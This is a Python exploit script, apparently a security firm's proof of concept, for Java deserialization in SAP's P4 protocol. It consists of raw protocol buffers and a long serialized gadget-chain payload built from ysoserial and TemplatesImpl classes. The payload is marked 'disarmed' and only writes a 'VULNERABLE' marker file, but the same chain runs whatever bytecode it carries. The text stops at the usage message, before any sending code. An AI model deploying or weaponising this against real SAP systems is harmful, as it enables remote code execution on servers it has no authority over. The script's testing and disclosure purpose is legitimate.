#
# Exploit for SAP P4 protocol using Java Deserialization
# Author: kai.ullrich@code-white.com
#
# For versions tested on see http://codewhitesec.blogspot.com/2017/05/sap-customers-make-sure-your-sapjvm-is.html
#

import socket
import sys
import os
import random

#
# P4 Buffers
#

pd = [

# Nummer 1,
# Laenge: 2
# Marker: Nein
# Warten: Nein
#", 

# Nummer 1+2,
# Laenge: 27
# Marker: Nein
# Warten: Ja
# Sourceport: Ja
{'buffer': ("\x76\x31\x18\x23\x70\x23\x34\x4e\x6f\x6e\x65\x3a\x31\x32\x37\x2e\x30\x2e\x31\x2e"
 "\x31\x3a{port}"), 
 'buffer_len': 27, #length
 'wait_for_resp': True, # wait for response
 'resp_buffer_size': 1024,
 'format_marker': False, # format with marker
 'format_src_port': True}, # format with source port
 
# Nummer 3,
# Laenge: 31
# Marker: Nein
# Warten: Ja
{'buffer': ("\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00"
 "\x00\x00\x0a\x00\x63\x00\x6f\x00\x63\x00\x72"),
 'buffer_len': 31, #length
 'wait_for_resp': True, #wait for resp
 'resp_buffer_size': 1024,
 'format_marker': False,
 'format_src_port': False },
 
# Nummer 4,
# Laenge: 36
# Marker: Ja (ganz am Ende)
# Warten: Nein
{'buffer': ("\x00\x00\x16\x00\x00\x00{header_part}\xff\xff\xff\xff\xfe\x00\x00\x00\x00\x00"
 "\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00{marker}"),
 'buffer_len': 36,
 'wait_for_resp': False,
 'format_marker': True,
 'format_src_port': False,
 'has_header_part': True },
 
# Nummer 5,
# Laenge: 131
# Marker: Ja (vorletzte Zeile vor dem Java-Objekt)
# Warten: Ja
{'buffer': ("\x00\x00{payload_length}\x00\x00{header_part}\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x67\x00\x65\x00\x74\x00\x43\x00\x6c"
 "\x00\x61\x00\x73\x00\x73\x00\x42\x00\x79\x00\x4e\x00\x61\x00\x6d\x00\x65\x00\x28"
 "\x00\x6a\x00\x61\x00\x76\x00\x61\x00\x2e\x00\x6c\x00\x61\x00\x6e\x00\x67\x00\x2e"
 "\x00\x53\x00\x74\x00\x72\x00\x69\x00\x6e\x00\x67\x00\x29\x00\x00\x00\x00\x00\x00"
 "\x00\x00{marker}{payload}"),
 'wait_for_resp': True, #wait for resp
 'resp_buffer_size': 1024,
 'format_marker': True,
 'format_src_port': False,
 'is_exploit': True,
 'length_before_payload': 106,
 'has_header_part': True } # length in message to be computed as: 276 + len(payload) - 4 - 10 
]

class prot_step (object):
    def __init__(self, dict):
        self.__dict__.update (dict)

    def __getattr__(self, name):
        if name in self.__dict__:
            return self.__dict__[name]
        if name == 'is_exploit' or name == 'wait_for_resp' or name == 'format_src_port' or name == 'format_marker' or name == 'has_header_part':
            return False
        elif name == 'resp_buffer_size' or name == 'buffer_len':
            return -1
        else:
            raise AttributeError ("object doesn't have attribute {}".format (name))

prot_dict = []

for x in pd:
    ps = prot_step(x)
    prot_dict.append (ps)

        
def get_payload_len_as_byte_arr (payload_length):   
 
    if (payload_length > 65536):
        print "Too big payload! Exiting ..."
        sys.exit (1)

    payl_len_as_byte = []
    payl_len_as_byte.append (chr(payload_length % 256))
    payl_len_as_byte.append (chr(payload_length // 256))
        
    return ''.join(payl_len_as_byte)

payload_disarmed = (
  "\xAC\xED\x00\x05\x73\x72\x00\x17\x6A\x61\x76\x61\x2E\x75\x74\x69"
  "\x6C\x2E\x4C\x69\x6E\x6B\x65\x64\x48\x61\x73\x68\x53\x65\x74\xD8"
  "\x6C\xD7\x5A\x95\xDD\x2A\x1E\x02\x00\x00\x78\x72\x00\x11\x6A\x61"
  "\x76\x61\x2E\x75\x74\x69\x6C\x2E\x48\x61\x73\x68\x53\x65\x74\xBA"
  "\x44\x85\x95\x96\xB8\xB7\x34\x03\x00\x00\x78\x70\x77\x0C\x00\x00"
  "\x00\x10\x3F\x40\x00\x00\x00\x00\x00\x02\x73\x72\x00\x3A\x63\x6F"
  "\x6D\x2E\x73\x75\x6E\x2E\x6F\x72\x67\x2E\x61\x70\x61\x63\x68\x65"
  "\x2E\x78\x61\x6C\x61\x6E\x2E\x69\x6E\x74\x65\x72\x6E\x61\x6C\x2E"
  "\x78\x73\x6C\x74\x63\x2E\x74\x72\x61\x78\x2E\x54\x65\x6D\x70\x6C"
  "\x61\x74\x65\x73\x49\x6D\x70\x6C\x09\x57\x4F\xC1\x6E\xAC\xAB\x33"
  "\x03\x00\x09\x49\x00\x0D\x5F\x69\x6E\x64\x65\x6E\x74\x4E\x75\x6D"
  "\x62\x65\x72\x49\x00\x0E\x5F\x74\x72\x61\x6E\x73\x6C\x65\x74\x49"
  "\x6E\x64\x65\x78\x5A\x00\x15\x5F\x75\x73\x65\x53\x65\x72\x76\x69"
  "\x63\x65\x73\x4D\x65\x63\x68\x61\x6E\x69\x73\x6D\x4C\x00\x19\x5F"
  "\x61\x63\x63\x65\x73\x73\x45\x78\x74\x65\x72\x6E\x61\x6C\x53\x74"
  "\x79\x6C\x65\x73\x68\x65\x65\x74\x74\x00\x12\x4C\x6A\x61\x76\x61"
  "\x2F\x6C\x61\x6E\x67\x2F\x53\x74\x72\x69\x6E\x67\x3B\x4C\x00\x0B"
  "\x5F\x61\x75\x78\x43\x6C\x61\x73\x73\x65\x73\x74\x00\x3B\x4C\x63"
  "\x6F\x6D\x2F\x73\x75\x6E\x2F\x6F\x72\x67\x2F\x61\x70\x61\x63\x68"
  "\x65\x2F\x78\x61\x6C\x61\x6E\x2F\x69\x6E\x74\x65\x72\x6E\x61\x6C"
  "\x2F\x78\x73\x6C\x74\x63\x2F\x72\x75\x6E\x74\x69\x6D\x65\x2F\x48"
  "\x61\x73\x68\x74\x61\x62\x6C\x65\x3B\x5B\x00\x0A\x5F\x62\x79\x74"
  "\x65\x63\x6F\x64\x65\x73\x74\x00\x03\x5B\x5B\x42\x5B\x00\x06\x5F"
  "\x63\x6C\x61\x73\x73\x74\x00\x12\x5B\x4C\x6A\x61\x76\x61\x2F\x6C"
  "\x61\x6E\x67\x2F\x43\x6C\x61\x73\x73\x3B\x4C\x00\x05\x5F\x6E\x61"
  "\x6D\x65\x71\x00\x7E\x00\x04\x4C\x00\x11\x5F\x6F\x75\x74\x70\x75"
  "\x74\x50\x72\x6F\x70\x65\x72\x74\x69\x65\x73\x74\x00\x16\x4C\x6A"
  "\x61\x76\x61\x2F\x75\x74\x69\x6C\x2F\x50\x72\x6F\x70\x65\x72\x74"
  "\x69\x65\x73\x3B\x78\x70\x00\x00\x00\x00\xFF\xFF\xFF\xFF\x00\x74"
  "\x00\x03\x61\x6C\x6C\x70\x75\x72\x00\x03\x5B\x5B\x42\x4B\xFD\x19"
  "\x15\x67\x67\xDB\x37\x02\x00\x00\x78\x70\x00\x00\x00\x02\x75\x72"
  "\x00\x02\x5B\x42\xAC\xF3\x17\xF8\x06\x08\x54\xE0\x02\x00\x00\x78"
  "\x70\x00\x00\x07\x0B\xCA\xFE\xBA\xBE\x00\x00\x00\x31\x00\x45\x0A"
  "\x00\x03\x00\x22\x07\x00\x43\x07\x00\x25\x07\x00\x26\x01\x00\x10"
  "\x73\x65\x72\x69\x61\x6C\x56\x65\x72\x73\x69\x6F\x6E\x55\x49\x44"
  "\x01\x00\x01\x4A\x01\x00\x0D\x43\x6F\x6E\x73\x74\x61\x6E\x74\x56"
  "\x61\x6C\x75\x65\x05\xAD\x20\x93\xF3\x91\xDD\xEF\x3E\x01\x00\x06"
  "\x3C\x69\x6E\x69\x74\x3E\x01\x00\x03\x28\x29\x56\x01\x00\x04\x43"
  "\x6F\x64\x65\x01\x00\x0F\x4C\x69\x6E\x65\x4E\x75\x6D\x62\x65\x72"
  "\x54\x61\x62\x6C\x65\x01\x00\x12\x4C\x6F\x63\x61\x6C\x56\x61\x72"
  "\x69\x61\x62\x6C\x65\x54\x61\x62\x6C\x65\x01\x00\x04\x74\x68\x69"
  "\x73\x01\x00\x13\x53\x74\x75\x62\x54\x72\x61\x6E\x73\x6C\x65\x74"
  "\x50\x61\x79\x6C\x6F\x61\x64\x01\x00\x0C\x49\x6E\x6E\x65\x72\x43"
  "\x6C\x61\x73\x73\x65\x73\x01\x00\x35\x4C\x79\x73\x6F\x73\x65\x72"
  "\x69\x61\x6C\x2F\x70\x61\x79\x6C\x6F\x61\x64\x73\x2F\x75\x74\x69"
  "\x6C\x2F\x47\x61\x64\x67\x65\x74\x73\x24\x53\x74\x75\x62\x54\x72"
  "\x61\x6E\x73\x6C\x65\x74\x50\x61\x79\x6C\x6F\x61\x64\x3B\x01\x00"
  "\x09\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D\x01\x00\x72\x28\x4C\x63"
  "\x6F\x6D\x2F\x73\x75\x6E\x2F\x6F\x72\x67\x2F\x61\x70\x61\x63\x68"
  "\x65\x2F\x78\x61\x6C\x61\x6E\x2F\x69\x6E\x74\x65\x72\x6E\x61\x6C"
  "\x2F\x78\x73\x6C\x74\x63\x2F\x44\x4F\x4D\x3B\x5B\x4C\x63\x6F\x6D"
  "\x2F\x73\x75\x6E\x2F\x6F\x72\x67\x2F\x61\x70\x61\x63\x68\x65\x2F"
  "\x78\x6D\x6C\x2F\x69\x6E\x74\x65\x72\x6E\x61\x6C\x2F\x73\x65\x72"
  "\x69\x61\x6C\x69\x7A\x65\x72\x2F\x53\x65\x72\x69\x61\x6C\x69\x7A"
  "\x61\x74\x69\x6F\x6E\x48\x61\x6E\x64\x6C\x65\x72\x3B\x29\x56\x01"
  "\x00\x08\x64\x6F\x63\x75\x6D\x65\x6E\x74\x01\x00\x2D\x4C\x63\x6F"
  "\x6D\x2F\x73\x75\x6E\x2F\x6F\x72\x67\x2F\x61\x70\x61\x63\x68\x65"
  "\x2F\x78\x61\x6C\x61\x6E\x2F\x69\x6E\x74\x65\x72\x6E\x61\x6C\x2F"
  "\x78\x73\x6C\x74\x63\x2F\x44\x4F\x4D\x3B\x01\x00\x08\x68\x61\x6E"
  "\x64\x6C\x65\x72\x73\x01\x00\x42\x5B\x4C\x63\x6F\x6D\x2F\x73\x75"
  "\x6E\x2F\x6F\x72\x67\x2F\x61\x70\x61\x63\x68\x65\x2F\x78\x6D\x6C"
  "\x2F\x69\x6E\x74\x65\x72\x6E\x61\x6C\x2F\x73\x65\x72\x69\x61\x6C"
  "\x69\x7A\x65\x72\x2F\x53\x65\x72\x69\x61\x6C\x69\x7A\x61\x74\x69"
  "\x6F\x6E\x48\x61\x6E\x64\x6C\x65\x72\x3B\x01\x00\x0A\x45\x78\x63"
  "\x65\x70\x74\x69\x6F\x6E\x73\x07\x00\x27\x01\x00\xA6\x28\x4C\x63"
  "\x6F\x6D\x2F\x73\x75\x6E\x2F\x6F\x72\x67\x2F\x61\x70\x61\x63\x68"
  "\x65\x2F\x78\x61\x6C\x61\x6E\x2F\x69\x6E\x74\x65\x72\x6E\x61\x6C"
  "\x2F\x78\x73\x6C\x74\x63\x2F\x44\x4F\x4D\x3B\x4C\x63\x6F\x6D\x2F"
  "\x73\x75\x6E\x2F\x6F\x72\x67\x2F\x61\x70\x61\x63\x68\x65\x2F\x78"
  "\x6D\x6C\x2F\x69\x6E\x74\x65\x72\x6E\x61\x6C\x2F\x64\x74\x6D\x2F"
  "\x44\x54\x4D\x41\x78\x69\x73\x49\x74\x65\x72\x61\x74\x6F\x72\x3B"
  "\x4C\x63\x6F\x6D\x2F\x73\x75\x6E\x2F\x6F\x72\x67\x2F\x61\x70\x61"
  "\x63\x68\x65\x2F\x78\x6D\x6C\x2F\x69\x6E\x74\x65\x72\x6E\x61\x6C"
  "\x2F\x73\x65\x72\x69\x61\x6C\x69\x7A\x65\x72\x2F\x53\x65\x72\x69"
  "\x61\x6C\x69\x7A\x61\x74\x69\x6F\x6E\x48\x61\x6E\x64\x6C\x65\x72"
  "\x3B\x29\x56\x01\x00\x08\x69\x74\x65\x72\x61\x74\x6F\x72\x01\x00"
  "\x35\x4C\x63\x6F\x6D\x2F\x73\x75\x6E\x2F\x6F\x72\x67\x2F\x61\x70"
  "\x61\x63\x68\x65\x2F\x78\x6D\x6C\x2F\x69\x6E\x74\x65\x72\x6E\x61"
  "\x6C\x2F\x64\x74\x6D\x2F\x44\x54\x4D\x41\x78\x69\x73\x49\x74\x65"
  "\x72\x61\x74\x6F\x72\x3B\x01\x00\x07\x68\x61\x6E\x64\x6C\x65\x72"
  "\x01\x00\x41\x4C\x63\x6F\x6D\x2F\x73\x75\x6E\x2F\x6F\x72\x67\x2F"
  "\x61\x70\x61\x63\x68\x65\x2F\x78\x6D\x6C\x2F\x69\x6E\x74\x65\x72"
  "\x6E\x61\x6C\x2F\x73\x65\x72\x69\x61\x6C\x69\x7A\x65\x72\x2F\x53"
  "\x65\x72\x69\x61\x6C\x69\x7A\x61\x74\x69\x6F\x6E\x48\x61\x6E\x64"
  "\x6C\x65\x72\x3B\x01\x00\x0A\x53\x6F\x75\x72\x63\x65\x46\x69\x6C"
  "\x65\x01\x00\x0C\x47\x61\x64\x67\x65\x74\x73\x2E\x6A\x61\x76\x61"
  "\x0C\x00\x0A\x00\x0B\x07\x00\x28\x01\x00\x33\x79\x73\x6F\x73\x65"
  "\x72\x69\x61\x6C\x2F\x70\x61\x79\x6C\x6F\x61\x64\x73\x2F\x75\x74"
  "\x69\x6C\x2F\x47\x61\x64\x67\x65\x74\x73\x24\x53\x74\x75\x62\x54"
  "\x72\x61\x6E\x73\x6C\x65\x74\x50\x61\x79\x6C\x6F\x61\x64\x01\x00"
  "\x40\x63\x6F\x6D\x2F\x73\x75\x6E\x2F\x6F\x72\x67\x2F\x61\x70\x61"
  "\x63\x68\x65\x2F\x78\x61\x6C\x61\x6E\x2F\x69\x6E\x74\x65\x72\x6E"
  "\x61\x6C\x2F\x78\x73\x6C\x74\x63\x2F\x72\x75\x6E\x74\x69\x6D\x65"
  "\x2F\x41\x62\x73\x74\x72\x61\x63\x74\x54\x72\x61\x6E\x73\x6C\x65"
  "\x74\x01\x00\x14\x6A\x61\x76\x61\x2F\x69\x6F\x2F\x53\x65\x72\x69"
  "\x61\x6C\x69\x7A\x61\x62\x6C\x65\x01\x00\x39\x63\x6F\x6D\x2F\x73"
  "\x75\x6E\x2F\x6F\x72\x67\x2F\x61\x70\x61\x63\x68\x65\x2F\x78\x61"
  "\x6C\x61\x6E\x2F\x69\x6E\x74\x65\x72\x6E\x61\x6C\x2F\x78\x73\x6C"
  "\x74\x63\x2F\x54\x72\x61\x6E\x73\x6C\x65\x74\x45\x78\x63\x65\x70"
  "\x74\x69\x6F\x6E\x01\x00\x1F\x79\x73\x6F\x73\x65\x72\x69\x61\x6C"
  "\x2F\x70\x61\x79\x6C\x6F\x61\x64\x73\x2F\x75\x74\x69\x6C\x2F\x47"
  "\x61\x64\x67\x65\x74\x73\x01\x00\x08\x3C\x63\x6C\x69\x6E\x69\x74"
  "\x3E\x01\x00\x18\x6A\x61\x76\x61\x2F\x69\x6F\x2F\x46\x69\x6C\x65"
  "\x4F\x75\x74\x70\x75\x74\x53\x74\x72\x65\x61\x6D\x07\x00\x2A\x01"
  "\x00\x0B\x63\x77\x37\x39\x31\x34\x36\x2E\x74\x78\x74\x08\x00\x2C"
  "\x01\x00\x15\x28\x4C\x6A\x61\x76\x61\x2F\x6C\x61\x6E\x67\x2F\x53"
  "\x74\x72\x69\x6E\x67\x3B\x29\x56\x0C\x00\x0A\x00\x2E\x0A\x00\x2B"
  "\x00\x2F\x01\x00\x13\x6A\x61\x76\x61\x2F\x69\x6F\x2F\x50\x72\x69"
  "\x6E\x74\x57\x72\x69\x74\x65\x72\x07\x00\x31\x01\x00\x19\x28\x4C"
  "\x6A\x61\x76\x61\x2F\x69\x6F\x2F\x4F\x75\x74\x70\x75\x74\x53\x74"
  "\x72\x65\x61\x6D\x3B\x29\x56\x0C\x00\x0A\x00\x33\x0A\x00\x32\x00"
  "\x34\x01\x00\x0A\x56\x55\x4C\x4E\x45\x52\x41\x42\x4C\x45\x08\x00"
  "\x36\x01\x00\x05\x77\x72\x69\x74\x65\x0C\x00\x38\x00\x2E\x0A\x00"
  "\x32\x00\x39\x01\x00\x05\x66\x6C\x75\x73\x68\x0C\x00\x3B\x00\x0B"
  "\x0A\x00\x32\x00\x3C\x01\x00\x05\x63\x6C\x6F\x73\x65\x0C\x00\x3E"
  "\x00\x0B\x0A\x00\x32\x00\x3F\x01\x00\x13\x6A\x61\x76\x61\x2F\x6C"
  "\x61\x6E\x67\x2F\x45\x78\x63\x65\x70\x74\x69\x6F\x6E\x07\x00\x41"
  "\x01\x00\x1D\x79\x73\x6F\x73\x65\x72\x69\x61\x6C\x2F\x50\x77\x6E"
  "\x65\x72\x31\x39\x33\x33\x34\x31\x36\x35\x34\x31\x37\x35\x33\x36"
  "\x01\x00\x1F\x4C\x79\x73\x6F\x73\x65\x72\x69\x61\x6C\x2F\x50\x77"
  "\x6E\x65\x72\x31\x39\x33\x33\x34\x31\x36\x35\x34\x31\x37\x35\x33"
  "\x36\x3B\x00\x21\x00\x02\x00\x03\x00\x01\x00\x04\x00\x01\x00\x1A"
  "\x00\x05\x00\x06\x00\x01\x00\x07\x00\x00\x00\x02\x00\x08\x00\x04"
  "\x00\x01\x00\x0A\x00\x0B\x00\x01\x00\x0C\x00\x00\x00\x2F\x00\x01"
  "\x00\x01\x00\x00\x00\x05\x2A\xB7\x00\x01\xB1\x00\x00\x00\x02\x00"
  "\x0D\x00\x00\x00\x06\x00\x01\x00\x00\x00\x2E\x00\x0E\x00\x00\x00"
  "\x0C\x00\x01\x00\x00\x00\x05\x00\x0F\x00\x44\x00\x00\x00\x01\x00"
  "\x13\x00\x14\x00\x02\x00\x0C\x00\x00\x00\x3F\x00\x00\x00\x03\x00"
  "\x00\x00\x01\xB1\x00\x00\x00\x02\x00\x0D\x00\x00\x00\x06\x00\x01"
  "\x00\x00\x00\x33\x00\x0E\x00\x00\x00\x20\x00\x03\x00\x00\x00\x01"
  "\x00\x0F\x00\x44\x00\x00\x00\x00\x00\x01\x00\x15\x00\x16\x00\x01"
  "\x00\x00\x00\x01\x00\x17\x00\x18\x00\x02\x00\x19\x00\x00\x00\x04"
  "\x00\x01\x00\x1A\x00\x01\x00\x13\x00\x1B\x00\x02\x00\x0C\x00\x00"
  "\x00\x49\x00\x00\x00\x04\x00\x00\x00\x01\xB1\x00\x00\x00\x02\x00"
  "\x0D\x00\x00\x00\x06\x00\x01\x00\x00\x00\x37\x00\x0E\x00\x00\x00"
  "\x2A\x00\x04\x00\x00\x00\x01\x00\x0F\x00\x44\x00\x00\x00\x00\x00"
  "\x01\x00\x15\x00\x16\x00\x01\x00\x00\x00\x01\x00\x1C\x00\x1D\x00"
  "\x02\x00\x00\x00\x01\x00\x1E\x00\x1F\x00\x03\x00\x19\x00\x00\x00"
  "\x04\x00\x01\x00\x1A\x00\x08\x00\x29\x00\x0B\x00\x01\x00\x0C\x00"
  "\x00\x00\x43\x00\x04\x00\x05\x00\x00\x00\x2F\xA7\x00\x03\x01\x4C"
  "\xBB\x00\x2B\x59\x12\x2D\xB7\x00\x30\x4D\xBB\x00\x32\x59\x2C\xB7"
  "\x00\x35\x4E\x2D\x12\x37\xB6\x00\x3A\x2D\xB6\x00\x3D\x2D\xB6\x00"
  "\x40\xA7\x00\x08\x3A\x04\xA7\x00\x03\xB1\x00\x01\x00\x05\x00\x26"
  "\x00\x29\x00\x42\x00\x00\x00\x02\x00\x20\x00\x00\x00\x02\x00\x21"
  "\x00\x11\x00\x00\x00\x0A\x00\x01\x00\x02\x00\x23\x00\x10\x00\x09"
  "\x75\x71\x00\x7E\x00\x0D\x00\x00\x01\xD4\xCA\xFE\xBA\xBE\x00\x00"
  "\x00\x31\x00\x1B\x0A\x00\x03\x00\x15\x07\x00\x17\x07\x00\x18\x07"
  "\x00\x19\x01\x00\x10\x73\x65\x72\x69\x61\x6C\x56\x65\x72\x73\x69"
  "\x6F\x6E\x55\x49\x44\x01\x00\x01\x4A\x01\x00\x0D\x43\x6F\x6E\x73"
  "\x74\x61\x6E\x74\x56\x61\x6C\x75\x65\x05\x71\xE6\x69\xEE\x3C\x6D"
  "\x47\x18\x01\x00\x06\x3C\x69\x6E\x69\x74\x3E\x01\x00\x03\x28\x29"
  "\x56\x01\x00\x04\x43\x6F\x64\x65\x01\x00\x0F\x4C\x69\x6E\x65\x4E"
  "\x75\x6D\x62\x65\x72\x54\x61\x62\x6C\x65\x01\x00\x12\x4C\x6F\x63"
  "\x61\x6C\x56\x61\x72\x69\x61\x62\x6C\x65\x54\x61\x62\x6C\x65\x01"
  "\x00\x04\x74\x68\x69\x73\x01\x00\x03\x46\x6F\x6F\x01\x00\x0C\x49"
  "\x6E\x6E\x65\x72\x43\x6C\x61\x73\x73\x65\x73\x01\x00\x25\x4C\x79"
  "\x73\x6F\x73\x65\x72\x69\x61\x6C\x2F\x70\x61\x79\x6C\x6F\x61\x64"
  "\x73\x2F\x75\x74\x69\x6C\x2F\x47\x61\x64\x67\x65\x74\x73\x24\x46"
  "\x6F\x6F\x3B\x01\x00\x0A\x53\x6F\x75\x72\x63\x65\x46\x69\x6C\x65"
  "\x01\x00\x0C\x47\x61\x64\x67\x65\x74\x73\x2E\x6A\x61\x76\x61\x0C"
  "\x00\x0A\x00\x0B\x07\x00\x1A\x01\x00\x23\x79\x73\x6F\x73\x65\x72"
  "\x69\x61\x6C\x2F\x70\x61\x79\x6C\x6F\x61\x64\x73\x2F\x75\x74\x69"
  "\x6C\x2F\x47\x61\x64\x67\x65\x74\x73\x24\x46\x6F\x6F\x01\x00\x10"
  "\x6A\x61\x76\x61\x2F\x6C\x61\x6E\x67\x2F\x4F\x62\x6A\x65\x63\x74"
  "\x01\x00\x14\x6A\x61\x76\x61\x2F\x69\x6F\x2F\x53\x65\x72\x69\x61"
  "\x6C\x69\x7A\x61\x62\x6C\x65\x01\x00\x1F\x79\x73\x6F\x73\x65\x72"
  "\x69\x61\x6C\x2F\x70\x61\x79\x6C\x6F\x61\x64\x73\x2F\x75\x74\x69"
  "\x6C\x2F\x47\x61\x64\x67\x65\x74\x73\x00\x21\x00\x02\x00\x03\x00"
  "\x01\x00\x04\x00\x01\x00\x1A\x00\x05\x00\x06\x00\x01\x00\x07\x00"
  "\x00\x00\x02\x00\x08\x00\x01\x00\x01\x00\x0A\x00\x0B\x00\x01\x00"
  "\x0C\x00\x00\x00\x2F\x00\x01\x00\x01\x00\x00\x00\x05\x2A\xB7\x00"
  "\x01\xB1\x00\x00\x00\x02\x00\x0D\x00\x00\x00\x06\x00\x01\x00\x00"
  "\x00\x3B\x00\x0E\x00\x00\x00\x0C\x00\x01\x00\x00\x00\x05\x00\x0F"
  "\x00\x12\x00\x00\x00\x02\x00\x13\x00\x00\x00\x02\x00\x14\x00\x11"
  "\x00\x00\x00\x0A\x00\x01\x00\x02\x00\x16\x00\x10\x00\x09\x70\x74"
  "\x00\x04\x50\x77\x6E\x72\x70\x77\x01\x00\x78\x73\x7D\x00\x00\x00"
  "\x01\x00\x1D\x6A\x61\x76\x61\x78\x2E\x78\x6D\x6C\x2E\x74\x72\x61"
  "\x6E\x73\x66\x6F\x72\x6D\x2E\x54\x65\x6D\x70\x6C\x61\x74\x65\x73"
  "\x73\x72\x00\x2D\x63\x6F\x6D\x2E\x73\x61\x70\x2E\x65\x6E\x67\x69"
  "\x6E\x65\x2E\x73\x65\x72\x76\x69\x63\x65\x73\x2E\x72\x6D\x69\x5F"
  "\x70\x34\x2E\x50\x34\x50\x72\x6F\x78\x79\x57\x72\x61\x70\x70\x65"
  "\x72\x37\x3A\x4E\x56\xF5\xE8\xF4\xCD\x02\x00\x02\x49\x00\x0E\x72"
  "\x65\x6D\x6F\x74\x65\x42\x72\x6F\x6B\x65\x72\x49\x64\x5B\x00\x02"
  "\x63\x77\x74\x00\x30\x5B\x4C\x63\x6F\x6D\x2F\x73\x61\x70\x2F\x65"
  "\x6E\x67\x69\x6E\x65\x2F\x73\x65\x72\x76\x69\x63\x65\x73\x2F\x72"
  "\x6D\x69\x5F\x70\x34\x2F\x50\x34\x43\x6C\x61\x73\x73\x57\x72\x61"
  "\x70\x70\x65\x72\x3B\x78\x70\xFF\xFF\xFF\xFF\x75\x72\x00\x30\x5B"
  "\x4C\x63\x6F\x6D\x2E\x73\x61\x70\x2E\x65\x6E\x67\x69\x6E\x65\x2E"
  "\x73\x65\x72\x76\x69\x63\x65\x73\x2E\x72\x6D\x69\x5F\x70\x34\x2E"
  "\x50\x34\x43\x6C\x61\x73\x73\x57\x72\x61\x70\x70\x65\x72\x3B\x80"
  "\xBB\xFD\xA8\xDC\x32\x1E\x5D\x02\x00\x00\x78\x70\x00\x00\x00\x01"
  "\x73\x72\x00\x2D\x63\x6F\x6D\x2E\x73\x61\x70\x2E\x65\x6E\x67\x69"
  "\x6E\x65\x2E\x73\x65\x72\x76\x69\x63\x65\x73\x2E\x72\x6D\x69\x5F"
  "\x70\x34\x2E\x50\x34\x43\x6C\x61\x73\x73\x57\x72\x61\x70\x70\x65"
  "\x72\x95\xA7\x38\x14\x23\x98\x5F\xAE\x02\x00\x08\x5A\x00\x0A\x69"
  "\x73\x50\x72\x65\x70\x61\x72\x65\x64\x5A\x00\x08\x69\x73\x53\x65"
  "\x72\x76\x65\x72\x4C\x00\x0F\x63\x6C\x61\x73\x73\x4C\x6F\x61\x64"
  "\x65\x72\x4E\x61\x6D\x65\x71\x00\x7E\x00\x04\x4C\x00\x09\x63\x6C"
  "\x61\x73\x73\x4E\x61\x6D\x65\x71\x00\x7E\x00\x04\x4C\x00\x0B\x63"
  "\x75\x72\x72\x65\x6E\x74\x53\x74\x75\x62\x74\x00\x29\x4C\x63\x6F"
  "\x6D\x2F\x73\x61\x70\x2F\x65\x6E\x67\x69\x6E\x65\x2F\x73\x65\x72"
  "\x76\x69\x63\x65\x73\x2F\x72\x6D\x69\x5F\x70\x34\x2F\x53\x74\x75"
  "\x62\x49\x6D\x70\x6C\x3B\x5B\x00\x05\x68\x6F\x73\x74\x73\x74\x00"
  "\x13\x5B\x4C\x6A\x61\x76\x61\x2F\x6C\x61\x6E\x67\x2F\x53\x74\x72"
  "\x69\x6E\x67\x3B\x4C\x00\x04\x69\x6E\x66\x6F\x74\x00\x2D\x4C\x63"
  "\x6F\x6D\x2F\x73\x61\x70\x2F\x65\x6E\x67\x69\x6E\x65\x2F\x73\x65"
  "\x72\x76\x69\x63\x65\x73\x2F\x72\x6D\x69\x5F\x70\x34\x2F\x53\x74"
  "\x75\x62\x42\x61\x73\x65\x49\x6E\x66\x6F\x3B\x5B\x00\x07\x75\x72"
  "\x6C\x4C\x69\x73\x74\x71\x00\x7E\x00\x19\x78\x70\x01\x00\x70\x74"
  "\x00\x1D\x6A\x61\x76\x61\x78\x2E\x78\x6D\x6C\x2E\x74\x72\x61\x6E"
  "\x73\x66\x6F\x72\x6D\x2E\x54\x65\x6D\x70\x6C\x61\x74\x65\x73\x70"
  "\x70\x70\x70\x78\x72\x00\x17\x6A\x61\x76\x61\x2E\x6C\x61\x6E\x67"
  "\x2E\x72\x65\x66\x6C\x65\x63\x74\x2E\x50\x72\x6F\x78\x79\xE1\x27"
  "\xDA\x20\xCC\x10\x43\xCB\x02\x00\x01\x4C\x00\x01\x68\x74\x00\x25"
  "\x4C\x6A\x61\x76\x61\x2F\x6C\x61\x6E\x67\x2F\x72\x65\x66\x6C\x65"
  "\x63\x74\x2F\x49\x6E\x76\x6F\x63\x61\x74\x69\x6F\x6E\x48\x61\x6E"
  "\x64\x6C\x65\x72\x3B\x78\x70\x73\x72\x00\x32\x73\x75\x6E\x2E\x72"
  "\x65\x66\x6C\x65\x63\x74\x2E\x61\x6E\x6E\x6F\x74\x61\x74\x69\x6F"
  "\x6E\x2E\x41\x6E\x6E\x6F\x74\x61\x74\x69\x6F\x6E\x49\x6E\x76\x6F"
  "\x63\x61\x74\x69\x6F\x6E\x48\x61\x6E\x64\x6C\x65\x72\x55\xCA\xF5"
  "\x0F\x15\xCB\x7E\xA5\x02\x00\x02\x4C\x00\x0C\x6D\x65\x6D\x62\x65"
  "\x72\x56\x61\x6C\x75\x65\x73\x74\x00\x0F\x4C\x6A\x61\x76\x61\x2F"
  "\x75\x74\x69\x6C\x2F\x4D\x61\x70\x3B\x4C\x00\x04\x74\x79\x70\x65"
  "\x74\x00\x11\x4C\x6A\x61\x76\x61\x2F\x6C\x61\x6E\x67\x2F\x43\x6C"
  "\x61\x73\x73\x3B\x78\x70\x73\x72\x00\x11\x6A\x61\x76\x61\x2E\x75"
  "\x74\x69\x6C\x2E\x48\x61\x73\x68\x4D\x61\x70\x05\x07\xDA\xC1\xC3"
  "\x16\x60\xD1\x03\x00\x02\x46\x00\x0A\x6C\x6F\x61\x64\x46\x61\x63"
  "\x74\x6F\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6F\x6C\x64\x78"
  "\x70\x3F\x40\x00\x00\x00\x00\x00\x0C\x77\x08\x00\x00\x00\x10\x00"
  "\x00\x00\x01\x74\x00\x08\x66\x35\x61\x35\x61\x36\x30\x38\x71\x00"
  "\x7E\x00\x09\x78\x76\x72\x00\x1D\x6A\x61\x76\x61\x78\x2E\x78\x6D"
  "\x6C\x2E\x74\x72\x61\x6E\x73\x66\x6F\x72\x6D\x2E\x54\x65\x6D\x70"
  "\x6C\x61\x74\x65\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x78\x70\x78"
)
    

if __name__ == '__main__':

    if (len(sys.argv) < 3):
        print ("Usage: sapwn.py <p4host> <p4port>")
